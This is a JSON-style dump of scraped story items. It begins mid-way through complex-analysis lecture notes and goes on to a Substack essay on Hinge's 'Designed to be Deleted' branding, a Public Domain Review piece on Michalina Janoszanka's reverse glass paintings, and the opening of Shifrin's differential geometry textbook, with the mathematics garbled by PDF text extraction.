πk n  )  +   i   sin  (   ϕ   + 2 πk n  )  for   k   = 0 , ..., n   −   1 Each non-zero   z   has   n   different   n th roots and these are related by rotations in the complex plane, see Figure 3. 2\n\nFigure 3:   The   n th roots are related by rotation through angle 2 π/n   in the complex plane.  1.2   Functions of Complex Variables  A standard notation we use for a complex function is  f   ( z ) =   u ( x, y ) +   iv ( x, y )  Examples  1. The simplest complex functions are   f   ( z ) =   a   =   constant   and   f   ( z ) =   z . By doing multiplication and addition with these, we obtain 2. Polynomials:  P   ( z ) =   a 0   +   a 1 z   +   ...   +   a n z n  Employing division operation, we obtain 3. Rational functions:  R ( z ) =   P   ( z )  Q ( z ) where   P   and   Q   are both polynomials. 4. A more advanced example is given by Sums of convergent power series:  f   ( z ) =  ∞ ∑  n =0  a n z n  If there exist   C >   0 and   ρ >   0 such that   | a n | ≤   Cρ − n   then the series is convergent for all   z   with  | z |   < ρ . The maximal such   ρ   is called the   radius of convergence   of   f   . In particular, if the sequence   a n  is bounded, then   f   is convergent at least for   | z |   <   1. For example, consider the following function (the sum of geometric progression):  f   ( z ) =  ∞ ∑  n =0  z n  3\n\nIn this case   a n   = 1 for all   n , thus the radius of convergence   ρ   = 1. However, we may define an   analytic continuation   of   f   outside the range   | z |   <   1, as: ˜ f   ( z ) =   1 1   −   z  which is defined for all   z   6   = 1. So   f   is undefined for   z >   1, but for all   z <   1 we have   f   ( z ) =  ˜ f   ( z ). Consider also the exponential function: exp( z ) =   e z   :=  ∞ ∑  n =0  z n  n ! Here   a n   =   1  n !   and the radius of convergence is   ρ   =   ∞ . The coefficients of this series are exactly the same as for the real exponential function, so, because the algebraic operations on real and complex numbers obey the same rules, the exponential function defined on complex numbers obeys the same algebra as the exponential function on real numbers:  e z 1   e z 2   = e z 1 + z 2  Hence, we have  e x + iy   =   e x   cos   y   +   ie x   sin   y  once we prove that  e iy   = cos   y   +   i   sin   y  To establish the latter formula, we write  e iy   =  ∞ ∑  n =0  i n y n  n !   =  ∞ ∑  k =0  ( − 1) k y 2 k  (2 k )!   +   i  ∞ ∑  k =0  ( − 1) k y 2 k +1  (2 k   + 1)!   = cos   y   +   i   sin   y  From the formula  e iϕ   = cos   ϕ   +   i   sin   ϕ,  we see that   e iϕ   is 2 π -periodic in   ϕ :  e iφ +2 πki   =   e iϕ   for   k   ∈   Z  This periodicity implies that the inverse of the exponential function is   multi-valued : ln   ( re iϕ )   = ln   r   +   i   ( ϕ   + 2 kπ )   for   k   ∈   Z  We may use the logarithm to define arbitrary complex powers of a complex number   z :  z α   :=   e α   ln   z  This function is also multivalued (when   α   is not an integer). 4\n\n5. The previous examples are ‘good’ functions, in the sense that they are analytic, as we will see later. However, we may also define ‘bad’ functions of complex variables, such as:  f   ( z ) = Re( z )  g ( z ) =   | z |  h ( z ) =   z ∗  These functions are non-analytic. The analyticity is the main topic here. While a typical complex function is not analytic, many important functions are analytic and, as a consequence, possess non-trivial and useful properties. The analyticity can be defined in several equivalent ways. We start with the notion of the derivative.  Definition 1.1.   The   derivative   of a complex function   f   at the point   z   is given by:  f   ′ ( z ) =   lim  ∆ z → 0  f   ( z   + ∆ z )   −   f   ( z ) ∆ z   (1) Note that this limit ∆ z   →   0 may be taken in many directions; for the derivative of   f   to exist, the limit must exist and be the same regardless of the direction in which the limit is taken.   In particular, we may write ∆ z   =   re iϕ , so the limit ∆ z   →   0 must be independent of   ϕ , the direction along which ∆ z   approaches zero.  Definition 1.2.   A function   f   ( z ) is   analytic   at the point   z 0   if it has a derivative at all points close to   z 0 . Note that   f   ( z ) =   | z | 2   is not analytic at   z   = 0, even though it has a derivative at   z   = 0, because one can show that it does not have a derivative for any   z   6   = 0.  Definition 1.3.   A function   f   ( z ) is   analytic   in an open region   D   if the derivative   f   ′ ( z ) exists at every points  z   ∈   D . Let us write   f   ( z ) =   u ( x, y ) +   iv ( x, y ). In order for   f   to have a derivative at   z , the functions   u   and   v   must be differentiable at the corresponding point in the   x   −   y   plane; however, the differentiability of   u   and   v   does not guarantee the existence of   f   ′ ( z ), i.e., it is a necessary but not sufficient condition.  Theorem 1.4   (Cauchy-Riemann Conditions) .   Let   f   ( z ) =   u ( x, y ) +   iv ( x, y ) . The derivative   f   ′ ( z )   exists at  z   =   x   +   iy   if and only if   u   and   v   are differentiable and satisfy the Cauchy-Riemann equations  ∂u ∂x   =   ∂v ∂y  ,   (2a)  ∂u ∂y   =   −   ∂v ∂x  .   (2b)  Proof.   Suppose   f   ′ ( z ) exists. Then the limit in eq. (1) exists and is independent of the direction in which the limit is taken. Therefore set ∆ z   = ∆ x   and we see that:  f   ′ ( z ) =   lim  ∆ x → 0  u ( x   + ∆ x, y ) +   iv ( x   + ∆ x, y )   −   u ( x, y ) +   iv ( x, y ) ∆ x   =   ∂u ∂x   +   i  ∂v ∂x  Similarly, if we take ∆ z   =   i ∆ y   then we find:  f   ′ ( z ) =   lim  ∆ x → 0  u ( x, y   + ∆ y ) +   iv ( x, y   + ∆ y )   −   u ( x, y ) +   iv ( x, y )  i ∆ y   =   − i  ∂u ∂y   +   ∂v ∂y  5\n\nEquating the real and imaginary parts gives eq. (2). Suppose conversely that   u   and   v   satisfy eq. (2).   We keep a general form for ∆ z   = ∆ x   +   i ∆ y   and then expand:  f   ( z   + ∆ z ) = u ( x   + ∆ x, y   + ∆ y ) +   iv ( x   + ∆ x, y   + ∆ y )  u ( x   + ∆ x, y   + ∆ y ) = u ( x, y ) +   ∂u ∂x   ∆ x   +   ∂u ∂y   ∆ y   +   o  (√ ∆ x 2   + ∆ y 2  )  v ( x   + ∆ x, y   + ∆ y ) = v ( x, y ) +   ∂v ∂x   ∆ x   +   ∂v ∂y   ∆ y   +   o  (√ ∆ x 2   + ∆ y 2  )  = ⇒   f   ( z   + ∆ z )   −   f   ( z ) =   ∂u ∂x   ∆ x   +   ∂u ∂y   ∆ y   +   i  (   ∂v ∂x   ∆ x   +   ∂v ∂y   ∆ y  )  +   o   ( | ∆ z | )   .  By eq. (2), the right-hand side of this formula is =  (   ∂u ∂x   +   i  ∂v ∂x  )  ∆ z   +   o   ( | ∆ z | ) and therefore   f   ′ ( z ) =   (   ∂u ∂x   +   i   ∂v ∂x  )   exists. Note the word ”differentiable” in the formulation of this theorem.   It means more than just the existence of the partial derivatives   ∂u ∂x   ,   ∂u ∂y   ,   ∂v ∂x   , and   ∂v ∂y   .   Namely, we want that   u   and   v   have derivatives along any direction (not just along the   x - and   y - axes). Or, equivalently, we want to have expansions  u ( x   + ∆ x, y   + ∆ y ) = u ( x, y ) +   ∂u ∂x   ∆ x   +   ∂u ∂y   ∆ y   +   o  (√ ∆ x 2   + ∆ y 2  )  v ( x   + ∆ x, y   + ∆ y ) = v ( x, y ) +   ∂v ∂x   ∆ x   +   ∂v ∂y   ∆ y   +   o  (√ ∆ x 2   + ∆ y 2  )  A sufficient condition for that is the continuity of   ∂u ∂x   ,   ∂u ∂y   ,   ∂v ∂x   , and   ∂v ∂y   . Thus, an equivalent definition of analyticity is this: the function is analytic in an open region   D   of the complex plane if its real and imaginary parts are differentiable and satisfy Cauchy-Riemann conditions at every point of   D . 6\n\n2   Lecture 2: Derivatives and integrals  2.1   Derivatives and integrals, Cauchy theorem  We repeat that a function   f   ( z ) is   analytic   (or holomorphic) at the point   z 0   if it has a derivative at all points  z   close to   z 0 . The derivative of   f   is defined like in the real case:  f   ′ ( z ) =   lim  ∆ z → 0  f   ( z   + ∆ z )   −   f   ( z ) ∆ z   ,  which is independent of the direction along which ∆ z   →   0. This independence condition is equivalent to the Cauchy-Riemann condition, i.e. letting   f   =   u   +   iv , we have  ∂u ∂x   =   ∂v ∂y  ,   ∂u ∂y   =   −   ∂v ∂x  .  The derivative satisfies the same rules as in the real case: for any analytic functions   f   and   g , we have 1. ( f   +   g ) ′   =   f   ′   +   g ′ , 2. ( f g ) ′   =   f   ′ g   +   f g ′ , 3. (   f g   ) ′   =   f   ′ g − f g ′  g 2   , 4. (chain rule) for any   z   in the domain of   g , ( f   ( g ( z ))) ′   =   f   ′ ( g ( z )) g ′ ( z ).  Remark   If   g   is the inverse of   f   , i.e. for any   z   in the domain of   f   ,   g ( f   ( z )) =   z , then   g ′ ( f   ( z )) =   1  f   ′ ( z )   , and  g ′ ( z ) =   1  f   ′ ( g ( z ))   . Some examples of how to derive the derivatives are given in what follows.  Example   i. Suppose   f   ( z ) =   c   for any   z   ∈   C , where   c   is a constant complex number.   Since for any  z,   ∆ z   ∈   C  f   ( z ) + ∆ z   −   f   ( z ) ∆ z   =   c   −   c  ∆ z   = 0 ,  the derivative of   f   is 0. ii. Suppose   f   ( z ) =   z   for any   z   ∈   C . Since for any   z,   ∆ z   ∈   C ,  f   ( z ) + ∆ z   −   f   ( z ) ∆ z   =   z   + ∆ z   −   z  ∆ z   = 1 ,  we get   f   ′ ( z ) = 1. iii. Using the product rule, for any   z   ∈   C , we get ( z n ) ′   =   nz n − 1  iv. Now, for any   z   ∈   C , letting   P   ( z ) =   a 0   +   a 1 z   +   ...   +   a n z n , we get the derivative of   P   as follows:  P   ′ ( z ) =   a 1   +   ...   +   na n z n − 1 .  v. Since any rational function can be written as   P Q   , where   P   and   Q   are polynomials, and since (   P Q   ) ′   =  P   ′ Q − P Q ′  Q 2   , we obtain that rational functions are analytic everywhere except for the points where   Q ( z ) = 0. 7\n\nvi. Suppose   f   is a power series, i.e.   f   ( z ) =   a 0   +   a 1 z   +   ...   +   a n z n   +   ... , then  f   ′ ( z ) =   a 1   + 2 a 2 z   +   ...   +   a n z n − 1   +   ...  Furthermore, given that   | a n | ≤   cρ − n , which implies that  | na n | ≤   (   cn ρ   ) ρ − ( n − 1)   ≤   ˜ c ˜ ρ − ( n − 1) ,   where ˜ ρ < ρ,   and ˜ c   large enough ,  we conclude that   f   ′   has the same radius convergence as that of   f   . Example. For   e z   =   ∑ ∞  i =0   z n  n !   , its derivative is ( e z   ) ′   = 1 +   z   +   ...   +   nz n − 1  n !   +   ...   =  ∞ ∑  i =0  z n  n !  =   e z   .  The inverse function of   e z   is denotes as ln   z   (recall that ln( re iψ   ) = ln   r   +   i ( ψ   + 2 kπ )). Using the rule for the derivative of the inverse function, we find (ln   z ) ′   =   1  e ln   z   =  1  z  .  vii. For any   α   ∈   R   and   z   ∈   C , ( z α ) ′   = ( e α   ln   z   ) ′   =   α z  e α   ln   z   =   αz α − 1 .  viii. Letting   ζ   be a Riemann Zeta function, i.e.   ζ ( z ) =   ∑ ∞  n =1   n − z   , then its derivative is:  ζ ′ ( z ) =   −  ∞ ∑  n =1  n − z   (ln   n ) .  Holomorphic functions have many wonderful, or even magical properties. For example, let   D   be a simply connected open region in   C , as in Figure 4.  Figure 4: A simply connected region   D .  Then, as we will show later, the following two statements are equivalent for a complex function   f   defined in  D : (a)   f   ′ ( z ) exists for all   z   in the domain   D , (b)   ∫   z z 0   f   ( ξ ) dξ   exists for all   z   and   z 0   in the domain   D . 8\n\nIt is indeed, unexpected: we know that for real functions of a real variable the existence of the derivative does not follow from the existence of the integral. Moreover, property (b) implies, in fact, that for any   z   ∈ D ,  f   ( z ) =   1 2 πi  ∫  γ  f   ( ξ )  ξ   −   z  dξ.   (3) This is   Cauchy formula , which plays the central role in this theory (here   γ   is the boundary of   D ; we move along   γ   anti-clockwise). We will explain the notion of the integral along the path   γ   in a moment.   Before that, we just note that this is indeed a magical formula: the values of the analytic function   f   at any point inside the domain   D   are determined by the values of   f   on the boundary of the domain only! Magical formulas have magical consequences: using the Cauchy formula, we will also show later that   f   has derivatives of   all orders   and the Taylor series of   f   converges to   f   . Nothing similar happens for real functions of a real variable, they may have first derivative, but not second derivative, or first and second derivative, but no third derivative, etc; or derivatives of all orders may exist, but the Taylor series may diverge, or converge to a wrong function - all these complications disappear for complex-valued functions of complex variables. In order to properly formulate these results, we need to introduce the notion of an integral over a path in the complex plane. Let   γ   :=   { z   =   z ( t ) |   t   ∈   [0 ,   1] }   be a continuous curve parameterized by a real parameter  t . Figure 5 shows a path connecting points   z (0) and   z (1).  Figure 5: A path   γ   in   D .  We define the integral over   γ   as:  ∫  γ  f   ( z ) dz   =   lim  n →∞  n − 1 ∑  k =0  f   ( z ( t k ))( z ( t k +1 )   −   z ( t k ) .   (4) Here   { t 0   = 0 , t 1 , ..., t n   = 1 }   is any partition of [0 ,   1] such that   t k +1   −   t k   tends uniformly to zero as   n   →   + ∞ . The main (and the simplest) example is when   t k   =   k n   .  Remark   It is important to remember that ( z ( t k +1 )   −   z ( t k )) in (4) is a complex number, not the length  | z ( t k +1 )   −   z ( t k ) | . The path   γ   is smooth when the function   z ( t ) is smooth (i.e., continuously differentiable). In this case, one uses the following formula for the computation of the integral:  ∫  γ  f   ( z ) dz   =  ∫   1 0  f   ( z ( t )) z ′ ( t ) dt.  9\n\nThe integral has the following basic properties. 1. If ˜ γ   is the same curve as   γ , just with opposite orientation, (i.e. ˜ z ( t ) =   z (1   −   t )), then  ∫  γ  f   ( z ) dz   =   −  ∫  ˜ γ  f   ( z ) dz.  2. Let the end point of   γ 1   be the starting point of   γ 2 . Then  ∫  γ 1 ∪ γ 2  f   ( z ) dz   =  ∫  γ 1  f   ( z ) dz   +  ∫  γ 2  f   ( z ) dz.  Note that Property 1 together with Property 2 implies that if   γ   =   γ 1   ∪   γ 2   where   γ 2   is the same path as   γ 1  just with opposite orientation (i.e.,   γ   is a closed path obtained by traversing the same arc twice, forwards and then backwards), then   ∫  γ   f   ( z ) dz   = 0. We note that the integral over a path   γ   is well-defined for any continuous function   f   , which does not need to be analytic. However, we will show in the next lecture that for analytic functions the integral   ∫  γ   f   ( z ) dz   does not change when we slightly deform   γ   without moving the end points, so we can write   ∫   z 1  z 0   f   ( ζ ) dζ   without indicating the path connecting the points   z 0   and   z 1 . 10",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2bc2eff96e2d954d",
    "title": {
      "en": "Matched and Deleted",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.dikshaupadhyay.com/p/matched-and-deleted",
    "score": 22,
    "by": "rgbimbochamp",
    "time": 1742535747,
    "content": "Share this postDiksha’s NookMatched and Deleted, But RememberedCopy linkFacebookEmailNotesMoreDiscover more from Diksha’s NookAn Engineer Turned MarketerSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign inMatched and Deleted, But RememberedThe curious case of Hinge and SATCDiksha UpadhyayMar 20, 20252Share this postDiksha’s NookMatched and Deleted, But RememberedCopy linkFacebookEmailNotesMoreShareThree years ago, I swiped right on the man who would become my husband. We met on Hinge. A few months ago, while watching an old episode of Sex and the City with a girlfriend, we hit the crossword scene - Carrie helping Big with the word ‘Hinge.’ The show aired years before the app was born, so no, this wasn’t product placement.But when I saw that, I remembered Hinge (the app). By then, I had already deleted Hinge, following its infamous tagline - “Designed to be Deleted.” But even after that, the app was a part of my subconscious. It was branding baked into my memory. That moment was weirdly nostalgic. Emotions dramatically influence memory retention and loyalty. Neuro-imaging studies show that emotionally charged marketing campaigns activate the amygdala, the brain’s emotional center. When you emotionally resonate with a brand - you become a loyal customer, an unpaid brand ambassador, so to speak. I may not be a customer anymore but I’m definitely a success story. How does Hinge stand out if it’s basically just another chat app for singles?The Economics of HopeLet’s be honest, most dating apps are barely-functional-dollar-stores disguised as “connection platforms.” The stats are bleak. Industry-wide, only about 10% of users find a long-term partner. Hinge? Roughly 5%. That’s worse than your odds at a Vegas table (a good 35%-50%). But still, people flock to it. Why? Because marketing sells possibility, not probability. It sells the dream of being in the lucky minority.Hinge doesn’t succeed because it matches people better, it succeeds because it markets hope better. And this hope is addictive. That’s the essence of positioning - it creates meaning where none inherently exists.And, based on the latest financial data, Hinge is making some serious money. In 2024, it generated an impressive $550 million in revenue, marking a 39% increase from 2023. With 30 million active users and 1.5 million paying subscribers (a 23% year-over-year increase), the app has made hope into a lucrative business model. Each paying user generates an average of $29.94 in revenue, contributing to an adjusted operating income of $166 million, a healthy 30% profit margin.Based on Hinge’s 2024 actuals, upcoming global launch of the revamped algorithm,  and expanded market reach, it is reasonable to project that in 2025, Hinge could reach 1.8–1.9 million payers at an RPP of about $31–32, driving direct revenue up to roughly $680–700 million. All this from an app with a 5% success rate.Positioning in a Sea of SamenessHinge’s tagline is brilliantly simple: \"Designed to be Deleted.\" In this competitive market of apps that want to maximize screen time, Hinge positions itself as the app that wants users to succeed and leave. It’s so original and aligns directly with the user’s goal - finding someone meaningful enough to delete the app for.Talk about competition, Tinder thrives on hookup culture with gamified swiping mechanics, Bumble empowers women to initiate conversation. But Hinge openly acknowledges the user’s ultimate desire. While Tinder and Bumble operate on pure reptilian impulses of swipe, match, ghost, repeat. Hinge sells itself as a solution to the problem that others created, like an antidote of the dating-app fatigue. Its core functionality (profiles, photos, messaging) is fundamentally similar, but the positioning completely flips the perception. It speaks in calm, nurturing tones, the kind that tricks you into thinking you’re making rational choices. Its interface is clean, minimalist. No neon-colored signs, just soft colors, personality prompts, and the promise that you are a discerning, relationship-minded adult rather than a dopamine-addicted cat in heat.Hinge effectively signals that it values long-term happiness over short-term engagement, which makes people more willing to believe in the brand. The company doubles down on this theme across all its messaging, even creating a mascot ‘Hingie’ that celebrates its own deletion with joyful self-destruction. The dark humor just reinforces Hinge’s authenticity. By daring to say “success means we disappear,” Hinge has set itself apart from the pack and strengthened its brand equity.Marketing Creates MeaningHinge isn’t the only one that focuses on creating emotional loyalty.De Beers’ “A Diamond is Forever” stands as the longest running marketing campaign of all time, having started in 1947. It’s successfully linked diamonds with eternal love and is responsible for making diamond engagement rings a culture.Apple’s iconic silhouette iPod campaigns never mentioned storage capacity or battery life. They sold the feeling of dancing to your own soundtrack.Nike’s “Just Do It” goes beyond shoes, becoming your best self, overcoming limits.These campaigns work because they tap into something fundamentally human. They understand that people don’t make decisions based on features or specifications, alone. They make decisions based on how something makes them feel.The Human Element That Can’t Be EngineeredDespite innovative products, countless tech startups remain bland and interchangeable in the public eye. The reason? They focus on what they do, not why they do it. Tech companies pour resources into engineering and user acquisition, but treat branding as an afterthought – maybe a logo here, a quirky Twitter (now X) voice there. Technical solutions solve functional problems but they’re not equipped to make people care. This leads to weak or inconsistent identities. A user might be unable to distinguish one SaaS tool from another because neither communicates a clear personality or mission. In fact, a lack of meaningful differentiation is a leading cause of startup failure.In my career so far, I’ve seen a handful of brilliant products fail. They didn’t lack any technical excellence, but because nobody cared, they didn’t work. This highlights the common blindspot in startup culture. Founders and investors obsess over scalability and total addressable markets but rarely ask: “Will someone genuinely care enough to use this?”Humans are wired for stories. Facts and features might pique interest, but stories stick in our minds and stir our emotions. In the battle for user engagement, storytelling is the secret weapon tech brands often underutilize. A compelling brand story gives users something to believe in and belong to. Consider how Hinge’s story (“we exist to help you find real love”) elevates it from the rest. Users who resonate with that mission feel a sense of alignment. That’s a far deeper engagement than one driven by habit or convenience. As one PR expert said, “people don’t want to be sold to; they want to hear a story” – a narrative that connects with their own needs and dreams.When brands deploy storytelling, whether through their origin story, customer success stories, or even the way they frame problem-solution, they activate emotions that drive action. Research has shown that while information makes us aware, emotion is often what motivates decision-making and loyalty. Lessons from HingeAfter all of this ruminating, this is what I know:Align with a real human problem: Find the emotional pain point in your user’s life and make addressing it your rallying cry.Dare to be different (even counterintuitive): Don’t be afraid of a value prop that seems to undermine your own usage metrics if it earns user trust.Bake brand values into the product: Every touchpoint should echo your core story.Harness social proof and stories: While humanizes the brand, it also provides evidence that you deliver on your promises.Stay culturally tuned-in: By engaging with the zeitgeist (whether it’s pop culture or addressing societal shifts, like remote work), you ensure your brand feels relevant.Full Circle MomentThat SATC moment felt full circle: a five-letter word for ‘to bring together’ had, indeed, brought me to the person I’d marry. That word, that brand - Hinge - will live rent-free in my head for years. It created a connection that went beyond the functionality of the product itself. So, to all product builders out there: Build something that works. But more importantly - build something people care about. As Bryan Eisenberg says:Facts tell, but stories sell. Subscribe to Diksha’s NookBy Diksha Upadhyay · Launched a year agoAn Engineer Turned MarketerSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.2 Likes2Share this postDiksha’s NookMatched and Deleted, But RememberedCopy linkFacebookEmailNotesMoreSharePrevious",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "f0278c8dffc99c32",
    "title": {
      "en": "Through a Glass Lushly: Michalina Janoszanka's Reverse Paintings (Ca. 1920s)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://publicdomainreview.org/collection/michalina-janoszanka/",
    "score": 37,
    "by": "prismatic",
    "time": 1742418939,
    "content": "Michalina Janoszanka (1889–1952) is an artist better known for her role on the other side of the canvas, as the muse and mentee of famed Polish painter Jacek Malczewski (1854–1929). She posed for countless symbolist paintings, appearing alone, alongside Malczewski in double-portraits, among satyrs, and as Medusa. However, Janoszanka was more than a muse. She was also an artist in her own right. Trained in Kraków and Vienna, she became a strong oil painter. Her themes were traditional: portraits, still lifes, and religious scenes. But what most captured her mentor’s excitement, not to mention the attention of the Young Poland modernist art movement, was something else: the surreal, kaleidoscopic landscapes she painted directly onto glass.Reverse painting, achieved by building up layers of pigment onto the backside of a pane of glass, has a long history. Having spread as far as China from its birthplace in fifteenth-century Italy, the technique was favored in Eastern Europe for devotional images and icons. These paintings could be produced quickly and cheaply, and “had the added attraction of reflecting the scant light in the dark rooms of the peasant homes”, writes scholar Phyllis Granoff. For all their strengths, however, reverse painting was not counted among European fine art. By Janoszanka’s time, the medium was firmly in the realm of folk art. What Michalina did with reverse painting was entirely distinct from the stiff religious imagery of traditional Polish glass painting. Brilliant gem tones and metallic lines frame her subjects — lush flowers and trees, stylized birds and frogs — in shadowy landscapes. She achieves textures and tones that call to mind other mediums. Dense linework becomes lace-like butterfly wings. In Winter, swirled, watercolor blues form a marbled field reminiscent of stained glass. At the birds’ breasts, Janoszanka leaves visible brush strokes, evoking individual feathers. Butterfly juxtaposes traditional flower patterns — simplified, geometric — with life-like dry leaves. The result is whimsical and stylized, but not childish. In Spring, where Janoszanka sets glowing trees against an exploding coral sky, the effect is plainly psychedelic. Across the Atlantic, reverse painting’s heyday had come and gone by the early 1900s. By layering not just paint but also crumpled metal foil over glass, American “tinsel painting” had stretched the limits of technique — but the medium, adopted mainly by middle-class women, was viewed as “feminine”. The craft had come to be seen as hackneyed and outdated, a Victorian throwback, and the twentieth century saw many such paintings “cracked and broken and thrown away”, writes curator Karli Wurzelbacher. But at that very moment, modernist painters began experimenting with the old technique. Artists like Marsden Hartley (1877–1943) and Rebecca Salsbury James (1891–1968) expanded on the traditional themes (flowers, still life, birds) and pushed reverse painting in novel directions: new color palettes, new approaches to line and space, new abstractions. These American experiments, beginning in the 1910s, coincided with Janoszanka’s work in Poland.Viewed side by side, the artists’ respective experiments in glass painting could not have been more different. But in Maine, New Mexico, and Kraków, reverse painting presented new possibilities to a generation of modernist artists. There is no telling whether Janoszanka was aware of these other experimenters in avant-garde glass painting. It is also unclear if she faced the same gendered critique: the critic Paul Rosenfeld, argues Wurzelbacher, “cast Hartley’s ‘canvases and rectangles of glass’ as effeminate”, comparing them to “some sweet bit of handiwork . . . the design of a sampler, a piece of embroidery.” Though her name remains overshadowed by Malczewski, Janoszanka’s work presents a compelling case for reassessment. Her dreamlike glass paintings are a bridge between folk tradition and modernist experimentation. They raise unanswered questions not just about Janoszanka’s career, but also about modernism’s engagement with glass painting across cultural boundaries. Questions that can be answered, ultimately, only through a return to the archive.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "713dddb4ea35db01",
    "title": {
      "en": "A single-fibre computer enables textile networks and distributed inference",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.nature.com/articles/s41586-024-08568-6",
    "score": 4,
    "by": "walterbell",
    "time": 1742384341,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d0bcffad54b657d9",
    "title": {
      "en": "Differential Geometry: A First Course in Curves and Surfaces [pdf]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://math.franklin.uga.edu/sites/default/files/users/user317/ShifrinDiffGeo.pdf",
    "score": 137,
    "by": "ibobev",
    "time": 1742651190,
    "content": "DIFFERENTIAL GEOMETRY: A First Course in Curves and Surfaces  October, 2024  Theodore Shifrin  University of Georgia  Dedicated to the memory of   Shiing-Shen Chern , my adviser and friend  ©2024 Theodore Shifrin  No portion of this work may be reproduced in any form without written permission of the author, other than duplication at nominal cost for those readers or students desiring a hard copy.\n\nCONTENTS  1.   CURVES   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   1  1. Examples, Arclength Parametrization   1 2. Local Theory: Frenet Frame   10 3. Some Global Results   23  2.   SURFACES: LOCAL THEORY   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   35  1. Parametrized Surfaces and the First Fundamental Form   35 2. The Gauss Map and the Second Fundamental Form   44 3. The Codazzi and Gauss Equations and the Fundamental Theorem of Surface Theory   57 4. Covariant Differentiation, Parallel Translation, and Geodesics   66  3.   SURFACES: FURTHER TOPICS   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   79  1. Holonomy and the Gauss-Bonnet Theorem   79 2. An Introduction to Hyperbolic Geometry   91 3. Surface Theory with Differential Forms   101 4. Calculus of Variations and Surfaces of Constant Mean Curvature   107  Appendix.  REVIEW OF LINEAR ALGEBRA AND CALCULUS   .   .   .   .   .   .   .   .   .   114  1. Linear Algebra Review   114 2. Calculus Review   116 3. Differential Equations   119  SOLUTIONS TO SELECTED EXERCISES   .   .   .   .   .   .   .   .   .   .   .   .   121 INDEX   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   125  Problems to which answers or hints are given at the back of the book are marked with an asterisk (*). Fundamental exercises that are particularly important (and to which reference is made later) are marked with a sharp ( ] ). October, 2024\n\nCHAPTER 1 Curves  1. Examples, Arclength Parametrization  We say a vector function   f W   .a; b/   !   R 3   is   C k   ( k   D   0; 1; 2; : : : ) if   f   and its first   k   derivatives,   f 0 ,   f 00 , . . . ,  f .k/ , exist and are all continuous. We say   f   is   smooth   if   f   is   C k   for every positive integer   k . A   parametrized curve   is a   C 3   (or smooth) map   ˛ W   I   !   R 3   for some interval   I   D   .a; b/   or   Œa; b   in   R   (possibly infinite). We say   ˛   is   regular   if   ˛ 0 .t/   ¤   0   for all   t   2   I   . We can imagine a particle moving along the path   ˛ , with its position at time   t   given by   ˛ .t/ . As we learned in vector calculus,  ˛ 0 .t/   D   d   ˛  dt   D   lim  h ! 0  ˛ .t   C   h/   \u0000   ˛ .t/  h  is the   velocity   of the particle at time   t . The velocity vector   ˛ 0 .t/   is tangent to the curve at   ˛ .t/   and its length,  k ˛ 0 .t/ k , is the speed of the particle.  Example 1.   We begin with some standard examples. (a) Familiar from linear algebra and vector calculus is a parametrized line: Given points   P   and   Q   in  R 3 , we let   v   D  \u0000 \u0000 !  PQ   D   Q   \u0000   P   and set   ˛ .t/   D   P   C   t v ,   t   2   R . Note that   ˛ .0/   D   P   ,   ˛ .1/   D   Q , and for   0   \u0014   t   \u0014   1 ,   ˛ .t/   is on the line segment   PQ . We ask the reader to check in Exercise 8 that of all paths from   P   to   Q , the “straight line path”   ˛   gives the shortest. This is typical of problems we shall consider in the future. (b) Essentially by the very definition of the trigonometric functions cos and sin, we obtain a very natural parametrization of a circle of radius   a , as pictured in Figure 1.1(a):  ˛ .t/   D   a \u0000 cos   t;   sin   t \u0001   D   \u0000 a   cos   t; a   sin   t \u0001 ;   0   \u0014   t   \u0014   2\u0019 :  ( a   cos   t, a   sin   t ) ( a   cos   t, b   sin   t )  t a   a  b  (a)   (b)  F IGURE   1.1  1\n\n2   C HAPTER   1. C URVES  (c) Now, if   a; b > 0   and we apply the linear map  T   W   R 2   !   R 2 ;   T .x; y/   D   .ax; by/;  we see that the unit circle   x 2 C y 2   D   1   maps to the ellipse   x 2 =a 2 C y 2 =b 2   D   1 . Since   T . cos   t;   sin   t/   D  .a   cos   t; b   sin   t/ , the latter gives a natural parametrization of the ellipse, as shown in Figure 1.1(b). (d) Consider the two cubic curves in   R 2   illustrated in Figure 1.2.   On the left is the   cuspidal cubic  y=tx  y 2 = x 3  y 2 = x 3 + x 2  (a)   (b)  F IGURE   1.2  y 2   D   x 3 , and on the right is the   nodal cubic   y 2   D   x 3   C x 2 . These can be parametrized, respectively, by the functions  ˛ .t/   D   .t 2 ; t 3 /   and   ˛ .t/   D   .t 2   \u0000   1; t.t 2   \u0000   1//:  (In the latter case, as the figure suggests, we see that the line   y   D   tx   intersects the curve when  .tx/ 2   D   x 2 .x   C   1/ , so   x   D   0   or   x   D   t 2   \u0000   1 .)  z = x 3  y = x 2  z 2 = y 3  F IGURE   1.3\n\n÷ 1. E XAMPLES , A RCLENGTH   P ARAMETRIZATION   3  (e) Now consider the   twisted cubic   in   R 3 , illustrated in Figure 1.3, given by  ˛ .t/   D   .t; t 2 ; t 3 /;   t   2   R :  Its projections in the   xy -,   xz -, and   yz -coordinate planes are, respectively,   y   D   x 2 ,   z   D   x 3 , and  z 2   D   y 3   (the cuspidal cubic). (f) Our next example is a classic called the   cycloid : It is the trajectory of a dot on a rolling wheel (circle).   Consider the illustration in Figure 1.4.   Assuming the wheel rolls without slipping, the  t O P a  F IGURE   1.4 distance it travels along the ground is equal to the length of the circular arc subtended by the angle through which it has turned. That is, if the radius of the circle is   a   and it has turned through angle  t , then the point of contact with the   x -axis,   Q , is   at   units to the right. The vector from the origin to  t   a   cos   t a   sin   t  a P C  O P Q C  F IGURE   1.5 the point   P   can be expressed as the sum of the three vectors   \u0000 \u0000 !  